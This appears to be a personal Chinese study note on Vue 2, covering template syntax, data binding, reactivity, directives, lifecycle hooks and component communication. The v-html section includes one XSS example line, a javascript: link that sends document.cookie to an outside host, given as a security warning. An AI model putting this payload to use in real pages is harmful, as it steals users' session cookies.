# Vue

## 简介

+ 一套用于构建用户界面的渐进式JavaScript框架
  - 渐进式：vue可以自底向上逐层的应用
+ 特点
  - 采用组件化模式，提高代码复用率、且让代码更好维护
  - 声明式编程，让编码人员无需直接操作DOM，提高开发效率

![img](file:///C:\Users\ThinkPad\Documents\Tencent Files\2899393618\Image\C2C\BAB4BF131693536BA6679E7AAE305A50.png)

## 核心

### 一、基础语法

```html
<div id='app'>
  {{ message }}	<!--js表达式-->
</div>
```
```javascript
<script>
  //编程范式：声明式编程
  var app = new Vue({
    el: '#app',  //用于挂载要管理的元素
    data: { //定义数据，数据供el所指定的容器去使用
      message: 'Hello World'
    }
  })
</script>
```
+ 容器和Vue实例是一一对应的

### 二、模板语法

#### 1. 插值语法

+ 功能：用于解析标签体内容
+ 写法：`{{xxx}}`，xxx是js表达式，且可以直接读取到data中的所有属性

#### 2. 指令语法

+ 功能：用于解析标签（包括：标签属性、标签体内容、绑定事件……）
+ 举例：`v-bind:href="xxx" ` 或简写为 `:href="xxx"`，xxx同样要写js表达式，且可以直接读取到data中的所有属性

### 三、数据绑定

#### 1. 单向数据绑定（v-bind）

+ 数据只能从data流向页面

+ `<input type="text" v-bind:value="name"></input>`

#### 2. 双向数据绑定（v-model）

+ 数据不仅能从data流向页面，还可以从页面流向data

+ `<input type="text" v-model:value="name"></input>`
  + 可以简写为`v-model=""`，因为v-model默认收集的就是value值
  + v-model只能应用在表单类（输入类）元素上

### 四、el与data的两种写法

#### 1. el的两种写法

+ new Vue的时候配置el属性
+ 先创建Vue实例，随后再通过vm.$mount()指定el的值

```js
const v = new Vue({
  // el: '#root',	// 第一种写法
  data: {}
})
// console.log(v)
v.$mount('#root')	// 第二种写法
```

#### 2. data的两种写法

+ 对象式
+ 函数式
  - 由Vue管理的函数，一定不要写箭头函数，一旦写了箭头函数，this就不再是Vue实例了

```js
new Vue({
  // data的第一种写法：对象式
  /* data: {
    name: 'sgg'
  } */
    
  // data的第二种写法：函数式
  data: function() {
    console.log(this)	// 此处的this是Vue实例对象
    return {
      name: 'sgg'
    }
  }
})
```

+ 只要改data里的数据，Vue就重新解析模板

### 五、MVVM模型

+ M：模型（Model）：对应data中的数据
+ V：视图（View）：模板
+ VM：视图模型（ViewModel）：Vue实例对象

![尚硅谷_前端技术_Vue全家桶](C:\Users\ThinkPad\Desktop\vue-note\尚硅谷_前端技术_Vue全家桶.jpg)

+ plus
  + data中所有的属性，最后都出现在了vm身上
  + vm身上所有的属性及Vue原型上所有的属性，在Vue模板中都可以直接使用

### 六、数据代理

#### 1. `Object.defineProperty`

```js
Object.defineProperty(obj, property, {
  value: ,
  enuerable:true,	// 控制属性是否可以枚举，默认值是false 
  writable: true,	// 控制属性是否可以被修改，默认值是false
  configurable: true	// 控制属性是否可以被删除，默认值是false
})
```

+ `Object.keys(obj)`
+ `delete obj.property`

```js
let number = 18
Object.defineProperty(obj, property, {
  // 当有人读取obj的property属性时，get函数（getter）就会被调用，且返回值就是property的值
  get:function() {
    return number
  },
  // 当有人修改obj的property属性时，set函数（setter）就会被调用，且会收到修改的具体值
  set:function(newValue) {
    number = newValue
  }
})
```

#### 2. 理解数据代理

+ 数据代理：通过一个对象代理对另一个对象中属性的操作（读/写）

+ Vue中的数据代理
  - 通过vm对象来代理data对象中数据的操作（读/写）
  - 好处：更加方便地操作data中的数据
  - 基本原理
    - 通过Object.defineProperty()把data对象中所有属性添加到vm上
    - 为每一个添加到vm身上的属性，都指定一个getter/setter
    - 在getter/setter内部去操作（读/写）data中对应的属性

![img](file:///C:\Users\ThinkPad\Documents\Tencent Files\2899393618\Image\C2C\EBFBB6F14767D91CE5DCDE06FBCD69CB.png)

+ 数据代理：把_data中的数据放到实例对象vm身上

### 七、事件处理

#### 1. 事件的基本使用

+ 绑定事件：`v-on:click=""` 或`@click=""`
+ 事件的回调需要配置在methods对象中，最终会在vm上
  + methods中配置的函数，不要用箭头函数，否则this就不是vm了
  + methods中配置的函数，都是被Vue所管理的函数，this的指向是vm或组件实例对象
+ `@click="demo"` 和 `@click="demo($event)"` 效果一致，但后者可以传参，$event是占位符

```js
const vm = new Vue({
  el: '#root',
  methods: {
    showInfo() {
      console.log(this)	// 此处的this是vm（Vue实例对象）
    }
  }
})
```

#### 2. 事件修饰符

+ `.prevent`：阻止事件的默认行为 = event.preventDefault()
+ `.stop`：阻止事件冒泡 = event.stopPropagation()
+ `.once`：事件只触发一次
+ `.capture`：使用事件的捕获模式
+ `.self`：只有event.target是当前操作的元素时才触发事件
+ `.passive`：事件的默认行为立即执行，无需等待事件回调执行完毕
+ 修饰符可以连续写

#### 3. 按键修饰符

+ Vue中常用的按键别名：
  - 回车 => enter
  - 删除 => delete（捕获“删除”和“退格”键）
  - 退出 => esc
  - 空格 => space
  - 换行 => tab（特殊，必须配合keydown去使用）
  - 上 => up
  - 下 => down
  - 左 => left
  - 右 => right
+ Vue未提供别名的按键，可以使用按键原始的key值去绑定，但注意要转为kebab-case（短横线命名）
+ 系统修饰符（用法特殊）：ctrl、alt、shift、meta
  - 配合keyup使用：按下修饰键的同时，再按下其他键，随后释放其他键，事件才被触发
  - 配合keydown使用：正常触发事件
+ 也可以使用keyCode去指定具体的按键（不推荐）
+ Vue.config.keyCodes.自定义键名 = 键码，可以去定制按键别名

### 八、计算属性与监视

#### 1. 计算属性

 ```js
 new Vue({
   computed: {
     fullName: {
       // get有什么作用？当有人读取fullName时，get就会被调用，且返回值就作为fullName的值
       // get什么时候调用？1.初次读取fullName时；2.所依赖的数据发生变化时
       get() {
         return this.firstname + '-' + this.lastname	// 此处的this是vm
       },
       // 非必需
       // set什么时候调用？当fullName被修改时
       set(value) {
         this.firstname = value.split('-')[0]
         this.lastname = value.split('-')[1]
       }
     }
   }
 })
 ```

+ 定义：要用的属性不存在，要通过已有属性计算得来

+ 原理：底层借助了Object.defineProperty方法提供的getter和setter

+ 优势：与methods实现相比，内部有缓存机制（复用），效率更高，调试方便

+ 备注：

  - 计算属性最终会出现在vm上，直接读取使用即可
  - 如果计算属性要被修改，那必须写set函数去响应修改，且set中要引起计算时依赖的数据发生改变

+ 简写：只考虑读取，不考虑修改

  ```js
  computed:{
    fullName() {
      return this.firstname + '-' + this.lastname
    }
  }
  ```


#### 2. 监视属性watch

+ 当被监视的属性变化时，回调函数自动调用，进行相关操作

+ 监视的属性必须存在，才能进行监视

+ 两种写法：

  - new Vue传入watch配置

    ```js
    new Vue({
      watch: {
        isHot: {
          immediate: true,	// 初始化时让handler调用一下
          // handler什么时候调用？当isHot发生改变时
          handler(newValue, oldValue) {}
        }
      }
    })
    ```

  - 通过vm.$watch监视

    ```js
    vm.$watch('isHot', {
      immediate: true,
      handler(newValue, oldValue) {}
    })
    ```

+ 深度监视

  - Vue中的watch默认不监视对象内部值的改变（一层）
  - 配置deep: true可以监测对象内部值改变（多层）
  - 备注
    - Vue自身可以监测对象内部值的改变，但Vue提供的watch默认不可以

  ```js
  watch: {
    // 监视多级结构中某个属性的变化
    'numbers.a': {},
        
    // 监视多级结构中所有属性的变化
    numbers: {
      deep: true
    }
  }
  ```

+ 简写

  ```js
  watch: {
    isHot(newValue, oldValue) {}
  }
  ```

  ```js
  wm.$watch('isHot', function(newValue, oldValue) {})
  ```

#### 3. computed和watch之间的区别

+ computed能完成的功能，watch都可以完成
+ watch能完成的功能，computed不一定能完成，例如：watch可以进行异步操作
+ 原则
  - 所有被Vue管理的函数，最好写成普通函数，这样this的指向才是vm或组件实例对象
  - 所有不被Vue所管理的对象（定时器的回调函数、ajax的回调函数等），最好写成箭头函数，这样this的指向才是vm或组件实例对象

### 九、class与style绑定

#### 1. 绑定class样式

+ 字符串写法，适用于：样式的类名不确定，需要动态确定
  +  `:class="mood"` `mood: 'normal'`
+ 数组写法，适用于：要绑定的样式个数不确定、名字也不确定
  - `:class="classArr"`
+ 对象写法，适用于：要绑定的样式个数确定、名字也确定，但要动态决定用不用
  + `:class="classObj"` `classObj: {atguigu1: false, atguigu2: false}`

####  2. 绑定style样式

+ `:style="{fontSize: fsize + 'px'}"` `fsize: 40`
+ `:style="styleObj"` `styleObj: {fontSize: '40px'}`
+ `:style="[styleObj, styleObj2]"`

### 十、条件渲染

+ v-if
  - 写法：
    - v-if="表达式"
    - v-else-if="表达式"
    - v-else="表达式"
  - 适用于：切换频率较低的场景
  - 特点：不展示的DOM元素直接被移除
  - 注意：v-if可以和v-else-if、v-else一起使用，但要求结构不能被“打断”
+ v-show
  - 写法：v-show="表达式"
  - 适用于：切换频率较高的场景
  - 特点：不展示的DOM元素未被移除，仅仅是使用样式隐藏掉
+ 使用v-if时，元素可能无法获取到，而使用v-show一定可以获取到

### 十一、列表渲染

#### 1. 列表渲染

+ 遍历数组 `v-for="(item, index) of arr"`
+ 遍历对象 `v-for="(value, key) of obj"`
+ 遍历字符串 `v-for="(char, index) of str"`
+ 遍历指定次数 `v-for="(number, index) of 5"`

#### 2. key作用与原理

![img](file:///C:\Users\ThinkPad\Documents\Tencent Files\2899393618\Image\C2C\97CC21AD1E0686D749D261F506731129.png)

![img](file:///C:\Users\ThinkPad\Documents\Tencent Files\2899393618\Image\C2C\C6B52DA095AB7A8A47AEF9B94CD35BD4.png)

+ 虚拟DOM中key的作用：

  - key是虚拟DOM对象的标识，当状态中的数据发生变化时，Vue会根据【新数据】生成【新的虚拟DOM】，随后Vue进行【新虚拟DOM】与【旧虚拟DOM】的差异比较

+ 对比规则：

  - 旧虚拟DOM中找到了与新虚拟DOM相同的key：
    - 若虚拟DOM中内容没变，直接使用之前的真实DOM
    - 若虚拟DOM中内容变了，则生成新的真实DOM，随后替换掉页面中之前的真实DOM
  - 旧虚拟DOM中未找到与新虚拟DOM相同的key：
    - 创建新的真实DOM，随后渲染到页面

+ 用index作为key可能会引发的问题：

  - 若对数据进行：逆序添加、逆序删除等破坏顺序操作：
    - 会产生没有必要的真实DOM更新 => 界面效果没问题，但效率低
  - 如果结构中还包含输入类的DOM：
    - 会产生错误DOM更新 => 界面有问题

+ 开发中如何选择key？

  + 最好使用每条数据的唯一标识作为key，比如id、手机号、身份证号、学号等唯一值

  + 如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表用于展示，使用index作为key是没有问题的

### 十二、监测数据

#### 1. Vue监测数据的原理

data -> vm._data 

+ Vue会监视data中所有层次的数据

+ 如何监测对象中的数据？

  ```js
      let data = {
        name: '尚硅谷',
        address: '北京'
      }
      // 创建一个监视的实例对象，用于监视data中属性的变化
      const obs = new Observer(data)
      console.log(obs)
  
      // 准备一个vm实例对象
      let vm = {}
      vm._data = data = obs
  
      function Observer(obj) {
        // 汇总对象中所有的属性形成一个数组
        const keys = Object.keys(obj)
        // 遍历
        keys.forEach((k) => {
          Object.defineProperty(this, k, {
            get() {
              return obj[k]
            },
            set(val) {
              console.log(`${k}被改了，我要去解析模板，生成虚拟DOM……`);
              obj[k] = val
            }
          })
        })
      }   
  ```

  通过setter实现监控，且要在new Vue时就传入要监测的数据

  - 对象中后追加的属性，Vue默认不做响应式处理
  - 如需给后添加的属性做响应式，使用：
    - `Vue.set(target, propertyName/index, value)`
    - `vm.$set(target, propertyName/index, value)`

+ 如何监测数组中的数据？

  ```js
  vm._data.hobby.push === Array.prototype.push	// false
  ```

  通过包裹数组更新元素的方法实现，本质就是做了两件事：

  - 调用原生对应的方法对数组进行更新
  - 重新解析模板，进而更新页面

+ 在Vue修改数组中的某个元素一定要用如下方法：

  + 使用这些API：`push()`、`pop()`、`shift()`、`unshift`、`splice()`、`sort()`、`reverse()`
  + `Vue.set()`或`vm.$set()`

+ 特别注意：`Vue.set()`和`vm.$set()`不能给vm或vm的根数据对象添加属性

### 十三、收集表单数据

+ `<input type="text">`，v-model收集的是value值，用户输入的就是value值
+ `<input type="radio>"`，v-model收集的是value值，且要给标签配置value值
+ `<input type="checkbox">`
  - 没有配置input的value属性，那么收集的就是checked（勾选 or 未勾选，是布尔值）
  - 配置input的value属性：
    - v-model的初始值是非数组，那么收集的就是checked（勾选 or 未勾选，是布尔值）
    - v-model的初始值是数组，那么收集的就是value组成的数组
+ 备注：v-model的三个修饰符
  - lazy：失去焦点再收集数据
  - number：输入字符串转为有效的数字
  - trim：输入首尾空格过滤

### 十四、过滤器

```js
<h1>{{time | timeFormater}}</h1>
<h1>{{time | timeFormater('YYYY_MM_DD')}}</h1>

new Vue({
  // 局部过滤器
  filters: {
    timeFormater(value, str='') {
      return dayjs(value).format(str)
    }
  }
})
```

```js
// 全局过滤器
Vue.filter('timeFormater', function(value) {})
new Vue({})
```

+ 定义：对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑的处理）
+ 语法：
  - 注册过滤器：`Vue.filter(name, callback)` 或 `new Vue(filters: {})`
  - 使用过滤器：`{{ xxx | 过滤器名 }}` 或 `v-bind:属性 = "xxx | 过滤器名"`
+ 备注：
  - 过滤器也可以接收额外参数、多个过滤器也可以串联
  - 并没有改变原本的数据，是产生新的对应的数据

### 十五、内置指令

#### 1. v-text

+ 向其所在的节点中渲染文本内容
+ 与插值语法的区别：v-text会替换掉节点中的内容，{{xx}}则不会

#### 2. v-html

+ 作用：向指定节点中渲染包含html结构的内容

+ 与插值语法的区别·：

  - v-html会替换掉节点中所有的内容，{{xxx}}则不会
  - v-html可以识别html结构

+ 严重注意：v-html有安全性问题

  `<a href=javascript:location.href="http://www.baidu.com?"+document.cookie></a>`

  - 在网站上动态渲染任意HTML是非常危险的，容易导致xss攻击
  - 一定要在可信的内容上使用v-html，永不要用在用户提交的内容上

#### 3. v-cloak（没有值）

```css
[v-cloak] {
  display: none;
}
```

+ 本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性
+ 使用css配合v-cloak可以解决网速慢页面展示出{{xxx}}的问题

#### 4. v-once（没有值）

+ v-once所在节点在初次动态渲染后，就视为静态内容了
+ 以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能

#### 5. v-pre

+ 跳过其所在节点的编译过程
+ 可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译

### 十六、自定义指令

+ 局部指令
  + 函数式

    ```js
    <span v-big="n"></span>
    
    new Vue({
      directives: {
        // big函数何时会被调用？1.指令与元素成功绑定时（一上来）。2.指令所在的模板被重新解析时。
        big(element, binding) {
          element.innerText = binding.value * 10
        }
      }
    })
    ```

  + 对象式

    ```js
    new Vue({
      directives: {
        fbind: {
          // 指令与元素成功绑定时（一上来）
          bind(element, binding) {},
          // 指令所在元素被插入页面时
          inserted(element, binding) {},
          // 指令所在的模板被重新解析时
          update(element, binding) {}
        }
      }
    })
    ```

+ 全局指令

  ```js
  Vue.directive('big', function() {})
  ```

  ```js
  Vue.directive('fbind', {})
  ```

+ 备注

  - this指的是window
  - 指令定义时不加v-，但使用时要加v-
  - 指令如果是多个单词，要使用kebab-case命名方式，不要用camelCase命名

### 十七、生命周期

+ Vue在关键时刻帮我们调用的一些特殊名称的函数
+ 生命周期函数中的this指向是vm或组件实例对象

```js
// Vue完成模板的解析并把初始的真实的DOM元素放入页面后（挂载完毕）调用mounted
mounted() {},
```

![生命周期](D:\BaiduNetdiskDownload\资料（含课件）\生命周期.png)

+ 常用的生命周期钩子：
  - mounted：发送ajax请求、启动定时器、绑定自定义事件、订阅消息等【初始化操作】
  - beforeDestory：清除定时器、解绑自定义事件、取消订阅消息等【收尾工作】
+ 关于销毁Vue实例：
  - 销毁后借助Vue开发者工具看不到任何信息
  - 销毁后自定义事件会失效，但原生DOM事件依然有效
  - 一般不会在beforeDestory操作数据，因为即便操作数据，也不会再触发更新流程了

### 十八、ref属性

+ 被用来给元素或子组件注册引用信息（id的替代者）
+ 应用在html标签上获取的是真实DOM元素，应用在组件标签上是组件实例对象（vc）
+ 使用方式
  - 打标识：`<h1 ref="xxx">...</h1>`或`<School ref="xxx"></School>`
  - 获取：`this.$refs.xxx`

## 组件化

+ 组件
  + 理解：实现应用中局部功能代码和资源的集合
  + 为什么：一个界面的功能很复杂
  + 作用：复用编码，简化项目编码，提高运行效率
  
+ 组件化
  - 当应用中的功能都是多组件的方式来编写的，那这个应用就是一个组件化的应用
  
+ 非单文件组件
  - 一个文件中包含有n个组件
  
+ 单文件组件
  - 一个文件中只包含有1个组件
  
  ```vue
  <template>
    <!-- 组件的结构 -->
  </template>
  
  <script>
    // 组件交互相关的代码（数据、方法等等）
    export default {}
  </script>
  
  <style>
    /* 组件的样式 */
  </style>
  ```
  
  

### 一、组件化的基本使用
#### 1. 创建组件构造器（定义组件）

+ 使用`Vue.extend(options)`创建，其中options和new Vue(options)时传入的那个options几乎一样，但也有点区别；
  + 区别：
    + el不要写——最终所有的组件都要经过一个vm的管理，由vm中的el决定服务那个容器
    + data必须写成函数——避免组件被复用时，数据存在引用关系
  + 备注：使用template可以配置组件结构

#### 2. 注册组件

+ 局部注册：靠`new Vue`的时候传入`components`选项
+ 全局注册：靠`Vue.component('组件名', 组件)`

#### 3. 使用组件（编写组件标签）

```javascript
//1.创建组件构造器对象
const cpnC = Vue.extend({
  template: `
    <div>
      <h2>我是标题</h2>
      <p>我是正文</p>
    </div>`
})
  
//2.注册组件(全局组件)
Vue.component('mycpn',cpnC)
```
```html
<div id='app'>
  <!--3.使用组件-->
  <mycpn></mycpn>
  <mycpn></mycpn>
  <div>
    <mycpn></mycpn>
  </div>
</div>
```
注意点：

+ 关于组件名
  - 一个单词组成
    - 第一种写法（首字母小写）：school
    - 第二种写法（首字母大写）：School
  - 多个单词组成
    - 第一种写法（kebab-case命名）：my-school
    - 第二种写法（CamelCase写法）：MySchool（需要Vue脚手架支持）
  - 备注
    - 组件名尽可能回避HTML中已有的元素名称，例如：h2、H2都不行
    - 可以使用name配置项指定组件在开发者工具中呈现的名字
+ 关于组件标签
  + 第一种写法：<school></school>
  + 第二种写法：<school/>
  + 备注：不使用脚手架时，<school/>会导致后续组件不能渲染
+ 一个简写方式
  + const school = Vue.extend(options) 可简写为：const school = options

### 二、全局组件和局部组件

#### 1. 全局组件
+ 上面方法注册的是全局组件
+ 全局组件意味着可以在任意Vue的实例下面使用
#### 2. 局部组件
+ 如果我们注册的组件是挂载在某个实例中，那么就是一个局部组件
```javascript
const cpnC = Vue.extend({
  template: `
    <div>
      <h2>我是标题</h2>
      <p>我是正文</p>
    </div>`
})
const app = new Vue({
  el: '#app',
  data :{
    message: ''
  },
  components: {
    mycpn: cpnC
  }
})
```
### 三、VueComponent构造函数

#### 1. VueComponent

+ school组件本质是一个名为VueComponent的构造函数，且不是程序员定义的，是Vue.extend生成的

+ 我们只需要写<school/>或<school></school>，Vue解析时会帮我们创建school组件的实例对象，即Vue帮我们执行的：`new VueComponent(options)`

+ 特别注意：每次调用Vue.extend，返回的就是一个全新的VueComponent

+ 关于this指向：

  - 组件配置中：

    data函数、methods中的函数、watch中的函数、computed中的函数，它们的this均是【VueComponent实例对象】

  - new Vue(options)配置中：

    data函数、methods中的函数、watch中的函数、computed中的函数，它们的this均是【Vue实例对象】

+ VueComponent的实例对象，以后简称vc（也可称之为：组件实例对象）

  Vue的实例对象，以后简称vm

  `vm.$children`

#### 2. 一个重要的内置关系

+ VueComponent.prototype.\__proto__ === Vue.prototype
+ 让组件实例对象（vc）可以访问到Vue原型上的属性、方法

![img](file:///C:\Users\ThinkPad\Documents\Tencent Files\2899393618\Image\C2C\C5D2F229C92E418BCCE76D69DFB4E50A.png)

### 四、父组件和子组件

```javascript
<script>
  //子组件
  const cpnC1 = Vue.extend({
    template: `
      <div>
        <h2>我是子标题</h2>
        <p>我是子内容</p>
      </div>
    `
  })
  
  //父组件
  const cpnC2 = Vue.extend({
    template: `
      <div>
        <h2>我是父标题</h2>
        <p>我是父内容</p>
        <cpn1></cpn1>
      </div>
    `,
    components: {
      cpn1: cpnC1
    }
  })
  
  // root组件
  const app = new Vue({
    el: '#app',
    data : {
      message: ''
    }，
    components: {
      cpn2: cpnC2
    }
  })
</script>
```
+ 父子组件错误用法：以子标签的形式在Vue实例中使用
  - 上述代码中cpn1是无法直接在html中使用的

#### 1. 注册组件语法糖
```javascript
<script>
  //注册全局组件
  Vue.component('mycpn',{
    template: `
      <div>
        <h2></h2>
        <p><p>
      </div>
    `
  })
</script>
```


```javascript
<script>
  //注册局部组件
  var app = new Vue({
    el: '#app',
    components: {
      'mycpn': {
        template: `
          <div>
            <h2></h2>
            <p><p>
          </div>
        `
      }
    }
  })
</script>
```

#### 2. 组件模板分离
```html
<template id='mycpn'>
  <div>
    <h2>我是标题</h2>
    <p>我是正文</p>
  </div>`
</template>
```
```javascript
<script>
  //注册全局组件
  Vue.component('mycpn',{
    template: '#mycpn'
  })
</script>
```
```javascript
<script>
  //注册局部组件
  var app = new Vue({
    el: '#app',
    components: {
      'mycpn': {
        template: '#mycpn'
      }
    }
  })
</script>
```
#### 3. 组件中的数据存放问题
+ 组件是一个单独功能模块的封装，组件中不能直接访问Vue实例中的data，组件有自己保存数据的地方
+ 组件对象也有一个data属性，**这个data属性必须是个函数**，而且这个函数返回一个对象，对象内部保存着数据
```javascript
<script>
  //注册全局组件
  Vue.component('mycpn',{
    template: '#mycpn',
    data() {
      return {
        title: 'abc'
      }
    }
  })
</script>
```
#### 4. 父子组件通信
![image](https://img.imgdb.cn/item/601508053ffa7d37b3ce7091.png)

##### ① 父组件通过`props`向子组件传递数据

```vue
<!--父组件-->
<div id='app'>
  <cpn v-bind:cmovies='movies' :cmessage='message'></cpn>
</div>

<!--子组件-->
<template id='cpn'>
  <div>
    <ul>
      <li v-for='item in cmovies'>{{ item }}</li>
    </ul>
    <h2>{{ cmessage }}</h2>
  </div>
</template>
```
+ props的值有两种方式：
  - **字符串数组**，数组中的字符串就是传递时的名称
  - **对象**，对象可以设置传递时的类型，也可以设置默认值等
+ 备注：
  + props是只读的，Vue底层会监测你对props的修改，如果进行了修改，就会发出警告，若业务需求确实需要修改，那么请复制props的内容到data中一份，然后去修改data中的数据
  + v-model绑定的值不能是props传过来的值
  + props传过来的若是对象类型的值，修改对象中的属性时Vue不会报错，但不推荐这样做
```vue
<script>
  const cpn = {
    template: '#cpn'，
    //props: ['cmovies','cmessage']
    props: {
      //类型限制
      cmovies: Array,
      //提供默认值
      cmessage: {
        type: String,
        default: '',
        required: true  //必传
      }
    }
  }
  
  const app = new Vue({
    el: '#app',
    data : {
      message: '',
      movies: ['海贼王','海尔兄弟','海的女儿']
    },
    components: {
      cpn //属性增强写法
    }
  })
</script>
```
+ 类型是对象或者数组时，默认值必须是一个函数
+ 当有自定义构造函数时，验证也支持自定义的类型
```vue
<script>
  function Person(firstname, lastname) {
    this.firstname = firstname
    this.lastname = lastname
  }
  
  const cpn = {
    template: '#cpn'，
    props: {
      //多个可能的类型
      propA: [String, Number],
      //对象或数组默认值必须从工厂函数获取
      propB: {
        type: Array,
        default() {
          return []
        }
      },
      //自定义类型
      propC: {
        author: Person
      },
      //自定义验证函数
      PropD: {
        validator: function(value){
          //这个值必须匹配下列字符串中的一个
          return ['success','warning','danger'].indexof(value) !== -1
        }
      }
    }
  }
</script>
```
+ 组件模板必须包含一个根元素(比如用外层div包起来)
+ html不支持驼峰命名（不分大小写），可以转换成短线连接

##### ② 子组件通过`$emit()`事件向父组件发送消息

+ v-on不仅可以用于监听DOM事件，也可以用于组件间的自定义事件
  - 自定义事件的流程：
    * 在子组件内，通过`$emit()`来触发事件
    * 在父组件内，通过`v-on`来监听子组件事件
```html
<!--父组件模板-->
<div id='app'>
  <!--第一种写法，使用@或v-on-->
  <cpn @itemclick='cpnClick'></cpn>
    
  <!--第二种写法，使用ref-->
  <cpn ref="cpn" />
</div>

<!--子组件模板-->
<template id='cpn'>
  <div>
    <button v-for='item in categories' @click='btnclick(item)'>{{ item.name }}</button>
    <button @click='unbind'>解绑事件</button>
  </div>
</template>
```
```vue
<script>
  //子组件
  const cpn = {
    template: '#cpn'，
    data() {
      return {
        categories: [
         {id: '01', name: '热门推荐'},
         {id: '02', name: '手机数码'},
         {id: '03', name: '家用家电'}
        ]
      }
    },
    methods: {
      btnclick(item) {
        this.$emit('itemclick',item)
      },
      unbind() {
        this.$off('itemclick')	// 解绑一个自定义事件
        this.$off(['demo1', 'demo2'])	// 解绑多个自定义事件
        this.$off()	// 解绑所有的自定义事件
      }
    }
  }
  //父组件
  const app = new Vue({
    el: '#app',
    components: {
      cpn //属性增强写法
    },
    methods: {
      cpnClick(item) {
        console.log(item)
      }
    },
    mounted() {
      // 更灵活
      this.$refs.cpn.$on('itemClick', this.cpnClick)
      // this.$refs.cpn.$once('itemClick', this.cpnClick)
    }
  })
</script>
```
+ 事件的回调在父组件中
+ 通过this.$refs.xxx.$on('事件名', 回调)绑定自定义事件时，回调要么配置在methods中，要么用箭头函数，否则this指向会出问题

##### ③ 结合双向绑定

```html
<div id='app'>
  <cpn :number='num' @numchange='numchange'/>
</div>

<template id='cpn'>
  <div>
    <h2>props:{{ number }}</h2>
    <h2>data: {{ dnumber }}</h2>
    <!--<input type='text' v-model='dnumber'>-->
    <input type='text' :value='dnumber' @input='numInput'>
  </div>
</template>
```

```html
<script>
  const app = new Vue({
    el:'#app',
    data: {
      num: 1
    },
    methods: {
      numchange(value) {
        this.num = parseInt(value)
      }
    },
    components: {
      cpn: {
        template: '#cpn',
        props: {
          number: Number
        },
        data() {
          return {
            dnumber: this.number
          }
        },
        methods: {
          numInput(event){
            //将input中的value赋值到dnumber中
            this.dnumber = event.target.value;
            //为了让父组件可以修改值，发出一个事件
            this.$emit('numchange',this.dnumber)
          }
        }
      }
    }
  })
</script>
```
--
`watch`实现

```
  components: {
    cpn: {
      template: '#cpn',
      props: {
        name: ''
      },
      data() {
        return {}
      },
      watch: {
        name(newValue, oldValue) {
        }
      }
    }
  }
```
#### 5. 父子组件的访问方式
+ 父组件访问子组件：使用`$children`或`$refs`
  - `$children` => 数组类型，它包含所有子组件对象，访问其中的子组件必须通过索引值
  - `$refs` => 对象类型，默认是一个空的对象，必须给特定的子组件绑定ref=''
```
<div id='app'>
  <cpn></cpn>
  <cpn></cpn>
  <cpn ref='a'></cpn>
  <button @click='btnClick'>按钮</button>
</div>
```
```
<script>
  const app = new Vue({
    el: '#app',
    data: {},
    methods: {
      btnClick() {
        //1.$children
        console.log(this.$children);
        for (let c of this.$children) {
          console.log(c.name);
          c.showMessage()
        }
        
        //2.$refs
        console.log(this.$refs.a.name)
      }
    }/
    components: {
      cpn: {
        template: '#cpn',
        data() {
          return {
            name:''
          }
        }
        methods: {
          showMessage() {
            console.log('showMessage');
          }
        }
      }
    }
  })
</script>
```
+ 子组件访问父组件：使用`$parent`
+ 访问根组件：`$root`
```
<template id='cpn'>
  <div>
    <ccpn></ccpn>
  </div>
</template>

<template id='ccpn'>
  <div>
    <button @click='btnClick'>按钮</button>
  </div>
</template>
```
```
<script>
  const app = new Vue({
    el: '#app',
    components: {
      cpn: {
        template: '#cpn',
        data() {
          return {
            name: ''
          }
        },
        components: {
          ccpn: {
            template: '#ccpn',
            methods: {
              btnClick() {
                //1.访问父组件
                console.log(this.$parent);
                console.log(this.$parent.name);
                //2.访问根组件
                console.log(this.$root)
              }
            }
          }
        }
      }
    }
  })
</script>
```

### 五、全局事件总线（GlobalEventBus）

+ 一种组件间通信的方式，适用于**任意组件间通信**

+ 安装全局事件总线

  ```js
  new Vue({
    beforeCreate() {
  	Vue.prototype.$bus = this	// $bus就是当前应用的vm
    }
  })
  ```

+ 使用全局事件总线

  - 接收数据：

    A组件想接收数据，则在A组件中给$bus绑定自定义事件，事件的回调留在A组件自身

    ```js
    methods() {
      demo(data) {}
    },
    mounted() {
      this.$bus.$on('xxx', this.demo)
    }
    ```

  - 提供数据：`this.$bus.$emit('xxxx', 数据)`

+ 最好在`beforeDestory`钩子中，用$off去解绑当前组件所用的事件

### 六、消息订阅与发布（pubsub）

+ 一种组件间通信的方式，适用于**任意组件间通信**

+ 使用步骤

  + 安装pubsub：`npm i pubsub-js`

  + 引入：`import pubsub from 'pubsub-js'`

  + 接收数据：A组件想接收数据，则在A组件中订阅消息，订阅的回调留在A组件自身

    ```js
    methods() {
      demo(msgName, data){}
    },
    mounted() {
      this.pid = pubsub.subscribe('xxx', this.demo)	// 订阅消息
    }
    ```

  + 提供数据：`pubsub.publish('xxx', 数据)`

    + 最好在`beforeDestory`钩子中，用`pubsub.unsubscribe(pid)`去取消订阅

### 七、slot-插槽

+ 组件的插槽是为了让我们封装的组件更加具有扩展性
  + 最好的封装方式就是将共性抽取到组件中，将不同暴露为插槽
  + 一旦我们预留了插槽，就可以让使用者根据自己的需求，决定插槽中插入什么内容
+ 作用：让父组件可以向子组件指定位置插入html结构，也是一种组件间通信的方式，适用于 **父组件 ===> 子组件**
#### 1. 插槽的基本使用

+ 父组件

  ```vue
  <div id='app'>
    <cpn><button>按钮</button></cpn>
    <cpn><span>呵呵</span></cpn>
  </div>
  ```

+ 子组件

  ```vue
  <template id='cpn'>
    <div>
      <h2></h2>
      <p></p>
      <slot></slot>
    </div>
  </template>
  ```

+ 插槽的默认值：`<slot>`中的内容表示，如果没有在该组件中插入任何其他内容，就默认显示该内容

  ```vue
  <slot><button>按钮</button></slot>
  ```

+ 如果有多个值同时放入到组件进行替换时，一起作为替换元素

  ```vue
  <div id='app'>
    <cpn>
      <i>我是替换插槽的内容</i>
      <p>我也是替换插槽的内容</p>
    </cpn>
  </div>
  ```

#### 2. 具名插槽
+ 给`slot`元素一个`name`属性即可
```vue
<div id='app'>
  <cpn><span slot='center'>标题</span></cpn>
  <cpn><button slot='left'>标题</button></cpn>
</div>
```
```vue
<template id='cpn'>
  <div>
    <slot name='left'><span>左边</span></slot>
    <slot name='center'><span>中间</span></slot>
    <slot name='right'><span>右边</span></slot>
  </div>
</template>
```
#### 3. 编译作用域
